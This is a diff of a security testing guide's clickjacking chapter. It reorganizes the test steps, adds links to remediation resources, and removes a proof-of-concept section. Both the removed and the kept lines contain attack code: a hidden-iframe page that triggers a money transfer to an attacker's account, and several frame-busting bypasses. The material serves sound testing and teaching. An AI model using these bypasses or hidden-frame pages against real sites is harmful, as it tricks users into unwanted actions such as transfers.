@@ -24,14 +24,16 @@ The power of this method is that the actions performed by the victim are origina
 
 ## Test Objectives
 
-- Understand security measures in place.
-- Assess how strict the security measures are and if they are bypassable.
+- Assess application vulnerability to clickjacking attacks.
+- Understand additional security measures in place.
 
 ## How to Test
 
-As mentioned above, this type of attack is often designed to allow an attacker to induce users’ actions on the target site, even if anti-CSRF tokens are being used. Testing should be conducted to determine if website pages are vulnerable to clickjacking attacks.
+As mentioned above, this type of attack is often designed to allow an attacker to induce users’ actions on the target site, even if anti-CSRF tokens are being used.
 
-Testers may investigate if a target page can be loaded in an inline frame by creating a simple web page that includes a frame containing the target web page. An example of HTML code to create this testing web page is displayed in the following snippet:
+### Load target website on a HTML interpreter usign html iframe tag
+
+Sites that do not protected against Frame Busting are vulnerable to this attack. If the `http://www.target.site` page is successfully loaded into a frame, then the site is vulnerable to Clickjacking. An example of HTML code to create this testing web page is displayed in the following snippet:
 
 ```html
 <html>
@@ -39,66 +41,16 @@ Testers may investigate if a target page can be loaded in an inline frame by cre
         <title>Clickjack test page</title>
     </head>
     <body>
-        <iframe src="http://www.target.site" width="500" height="500"></iframe>
+        <iframe src="http://www.target.site" width="400" height="400"></iframe>
     </body>
 </html>
 ```
 
-If the `http://www.target.site` page is successfully loaded into the frame, then the site is vulnerable and has no type of protection against clickjacking attacks.
-
-### Bypass Clickjacking Protection
-
-If the `http://www.target.site` page does not appear in the inline frame, the site probably has some form of protection against clickjacking. It’s important to note that this isn’t a guarantee that the page is totally immune to clickjacking.
-
-Methods to protect a web page from clickjacking can be divided into a few main mechanisms. It is possible to bypass these methods in some circumstances by employing specific workarounds. For further OWASP resources on clickjacking defense, see the [OWASP Clickjacking Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html).
-
-#### Client-side Protection: Frame Busting
-
-The most common client-side method, that has been developed to protect a web page from clickjacking, is called Frame Busting and it consists of a script in each page that should not be framed. The aim of this technique is to prevent a site from functioning when it is loaded inside a frame.
-
-The structure of frame busting code typically consists of a "conditional statement" and a "counter-action" statement. For this type of protection, there are some workarounds that fall under the name of "Bust frame busting". Some of this techniques are browser-specific while others work across browsers.
-
-##### Mobile Website Version
-
-Mobile versions of the website are usually smaller and faster than the desktop ones, and they have to be less complex than the main application. Mobile variants have often less protection since there is the wrong assumption that an attacker could not attack an application by the smart phone. This is fundamentally wrong, because an attacker can fake the real origin given by a web browser, such that a non-mobile victim may be able to visit an application made for mobile users. From this assumption follows that in some cases it is not necessary to use techniques to evade frame busting when there are unprotected alternatives, which allow the use of same attack vectors.
-
-##### Double Framing
-
-Some frame busting techniques try to break frame by assigning a value to the `parent.location` attribute in the "counter-action" statement.
-
-Such actions are, for example:
-
-- `self.parent.location` = `document.location`
-- `parent.location.href` = `self.location`
-- `parent.location` = `self.location`
-
-This method works well until the target page is framed by a single page. However, if the attacker encloses the target web page in one frame which is nested in another one (a double frame), then trying to access to `parent.location` becomes a security violation in all popular browsers, due to the descendant frame navigation policy. This security violation disables the counter-action navigation.
-
-Target site frame busting code (`example.org`):
-
-```javascript
-if(top.location!=self.locaton) {
-    parent.location = self.location;
-}
-```
-
-Attacker’s top frame (`fictitious2.html`):
-
-```html
-<iframe src="fictitious.html">
-```
-
-Attacker’s fictitious sub-frame (`fictitious.html`):
-
-```html
-<iframe src="http://example.org">
-```
-
-##### Disabling JavaScript
+### Test webpage against disabled javascript
 
 Since these type of client-side protections relies on JavaScript frame busting code, if the victim has JavaScript disabled or it is possible for an attacker to disable JavaScript code, the web page will not have any protection mechanism against clickjacking.
 
-There are three deactivation techniques that can be used with frames:
+There are few deactivation techniques that can be used with frames. More in depth techniques can be found on the [Clickjacking Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html).
 
 - Sandbox attribute: with HTML5 there is a new attribute called "sandbox". It enables a set of restrictions on content loaded into the iframe. At this moment this attribute is only compatible with Chrome and Safari.
 
@@ -108,9 +60,12 @@ Example:
 <iframe src="http://example.org" sandbox></iframe>
 ```
 
-- Design mode: Paul Stone showed a security issue concerning the "designMode" that can be turned on in the framing page (via document.designMode), disabling JavaScript in top and sub-frame.
+### Test application Compatibility and Acessibility Mode
 
-##### OnBeforeUnload Event
+Mobile versions of the website are usually smaller and faster than the desktop ones, and they have to be less complex than the main application. Mobile variants have often less protection since there is the wrong assumption that an attacker could not attack an application by the smart phone. This is fundamentally wrong, because an attacker can fake the real origin given by a web browser, such that a non-mobile victim may be able to visit an application made for mobile users. From this assumption follows that in some cases it is not necessary to use techniques to evade frame busting when there are unprotected alternatives, which allow the use of same attack vectors.
+Site running on acessibility mode should also be tested against clickjacking since site framming could be affected.
+
+### OnBeforeUnload Event
 
 The `onBeforeUnload` event could be used to evade frame busting code. This event is called when the frame busting code wants to destroy the iframe by loading the URL in the whole web page and not only in the iframe. The handler function returns a string that is prompted to the user asking confirm if he wants to leave the page. When this string is displayed to the user is likely to cancel the navigation, defeating target's frame busting attempt.
 
@@ -160,7 +115,7 @@ Attacker's page:
 <iframe src="http://example.org">
 ```
 
-##### XSS Filter
+#### XSS Filter
 
 Starting from Google Chrome 4.0 and from IE8 there were introduced XSS filters to protect users from reflected XSS attacks. Nava and Lindsay have observed that these kind of filters can be used to deactivate frame busting code by faking it as malicious code.
 
@@ -202,7 +157,7 @@ Attacker code:
 <iframe src="http://example.org/?param=if(top+!%3D+self)+%7B+top.location%3Dself.location%3B+%7D">
 ```
 
-##### Redefining Location
+#### Redefining Location
 
 For several browsers the `document.location` variable is an immutable attribute. However, for some version of Internet Explorer and Safari, it is possible to redefine this attribute. This fact can be exploited to evade frame busting code.
 
@@ -228,6 +183,15 @@ Example:
 <iframe src="http://example.org"></iframe>
 ```
 
+Some frame busting action try to break frame by assigning a value to the `parent.location` attribute in the "counter-action" statement.
+Such actions are, for example:
+
+- `self.parent.location` = `document.location`
+- `parent.location.href` = `self.location`
+- `parent.location` = `self.location`
+
+This method works well until the target page is framed by a single page. However, if the attacker encloses the target web page in one frame which is nested in another one (a double frame), then trying to access to `parent.location` becomes a security violation in all popular browsers, due to the descendant frame navigation policy. This security violation disables the counter-action navigation.
+
 #### Server-side Protection: X-Frame-Options
 
 An alternative approach to client-side frame busting code consists of an header based defense. The `X-FRAME-OPTIONS` header is sent from the server on HTTP responses and is used to mark web pages that shouldn't be framed. This header can take the values `DENY`, `SAMEORIGIN`, `ALLOW-FROM` origin, or non-standard `ALLOWALL`. The recommended value is `DENY`.
@@ -248,137 +212,11 @@ The `frame-ancestors` directive in the HTTP Content-Security-Policy (CSP) specif
 
 Also `frame-ancestors` allows a site to authorize multiple domains using the normal Content Security Policy semantics.
 
-### Create a Proof of Concept
+### Remediation
 
-Once we have discovered that the site we are testing is vulnerable to clickjacking attack, we can proceed with the development of a "proof of concept" (PoC) to demonstrate the vulnerability. It is important to note that, as mentioned previously, these attacks can be used in conjunction with other forms of attacks (for example CSRF attacks) and could lead to overcome anti-CSRF tokens. In this regard we can imagine that, for example, the `example.org` website allows to authenticated and authorized users to make a transfer of money to another account.
-
-Suppose that to execute the transfer the developers have planned three steps. In the first step the user fill a form with the destination account and the amount. In the second step, whenever the user submits the form, is presented a summary page asking the user confirmation (like the one presented in the following picture).
-
-![Clickjacking Example Step 2](images/Clickjacking_example_step2.png)\
-*Figure 4.11.9-3: Clickjacking Example Step 2*
-
-Following a snippet of the code for the step 2:
-
-```html
-//generate random anti CSRF token
-$csrfToken = md5(uniqid(rand(), TRUE));
-
-//set the token as in the session data
-$_SESSION['antiCsrf'] = $csrfToken;
-
-//Transfer form with the hidden field
-$form = '
-<form name="transferForm" action="confirm.php" method="POST">
-        <div class="box">
-        <h1>BANK XYZ - Confirm Transfer</h1>
-        <p>
-        Do You want to confirm a transfer of <b>'. $_REQUEST['amount'] .' &euro;</b> to account: <b>'. $_REQUEST['account'] .'</b> ?
-        </p>
-        <label>
-            <input type="hidden" name="amount" value="' . $_REQUEST['amount'] . '" />
-            <input type="hidden" name="account" value="' . $_REQUEST['account'] . '" />
-            <input type="hidden" name="antiCsrf" value="' . $csrfToken . '" />
-            <input type="submit" class="button" value="Transfer Money" />
-        </label>
-
-        </div>
-</form>';
-```
-
-In the last step are planned security controls and then, if all is OK, the transfer is done. In the following listing a snippet of code of the last step is presented:
-
-> Note: in this example, for simplicity, there is no input sanitization, but it has no relevance to block this type of attack
-
-```javascript
-if( (!empty($_SESSION['antiCsrf'])) && (!empty($_POST['antiCsrf'])) )
-{
-    // input logic and sanization checks
-
-    // check the anti-CSRF token
-    if(($_SESSION['antiCsrf'] == $_POST['antiCsrf']) {
-        echo '<p> '. $_POST['amount'] .' &euro; successfully transferred to account: '. $_POST['account'] .' </p>';
-    }
-} else {
-    echo '<p>Transfer KO</p>';
-}
-```
-
-As you can see the code is protected from CSRF attack both with a random token generated in the second step and accepting only variable passed via POST method. In this situation an attacker could forge a CSRF + Clickjacking attack to evade anti-CSRF protection and force a victim to do a money transfer without her consent.
-
-The target page for the attack is the second step of the money transfer procedure. Since the developers put the security controls only in the last step, thinking that this is secure enough, the attacker could pass the account and amount parameters via GET method.
-
-> Note: there is an advanced clickjacking attack that permits to force users to fill a form, so also in the case in which is required to fill a form, the attack is feasible
-
-The attacker's page may look like a simple and harmless web page like the one presented below:
-
-![Clickjacking Example Malicious Page 1](images/Clickjacking_example_malicious_page_1.png)\
-*Figure 4.11.9-4: Clickjacking Example Malicious Page 1*
-
-But playing with the CSS opacity value we can see what is hidden under the seemingly innocuous web page.
-
-![Clickjacking Example Malicious Page 2](images/Clickjacking_example_malicious_page_2.png)\
-*Figure 4.11.9-5: Clickjacking Example Malicious Page 2*
-
-The clickjacking code to create this page is presented below:
-
-```html
-<html>
-    <head>
-        <title>Trusted web page</title>
-
-        <style type="text/css"><!--
-            *{
-                margin:0;
-                padding:0;
-            }
-            body {  
-                background:#ffffff;
-            }
-            .button
-            {
-                padding:5px;
-                background:#6699CC;
-                left:275px;
-                width:120px;
-                border: 1px solid #336699;
-            }
-            #content {
-                width: 500px;
-                height: 500px;
-                margin-top: 150px ;
-                margin-left: 500px;
-            }
-            #clickjacking
-            {
-                position: absolute;
-                left: 172px;
-                top: 60px;
-                filter: alpha(opacity=0);
-                opacity:0.0
-            }
-        //--></style>
-
-    </head>
-    <body>
-        <div id="content">
-            <h1>www.owasp.com</h1>
-            <form action="http://www.owasp.com">
-                <input type="submit" class="button" value="Click and go!">
-            </form>
-        </div>
-
-                <iframe id="clickjacking" src="http://localhost/csrf/transfer.php?account=ATTACKER&amount=10000" width="500" height="500" scrolling="no" frameborder="none">
-                </iframe>
-    </body>
-</html>
-```
-
-With the help of CSS (note the `#clickjacking` block) we can mask and suitably position the iframe in such a way as to match the buttons. If the victim click on the button "Click and go!" the form is submitted and the transfer is completed.
-
-![Clickjacking Example Malicious Page 3](images/Clickjacking_example_malicious_page_3.png)\
-*Figure 4.11.9-6: Clickjacking Example Malicious Page 3*
-
-The example presented uses only basic clickjacking technique, but with advanced technique is possible to force user filling form with values defined by the attacker.
+- For measures to prevent Clickjacking, see the [Clickjacking Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html).
+- For interactive labs on Clickjacking visit [Port Swigger website](https://portswigger.net/web-security/clickjacking)
+- For additional resources on ClickJacking visit the [Owasp community](https://owasp.org/www-community/attacks/Clickjacking)
 
 ## References
 
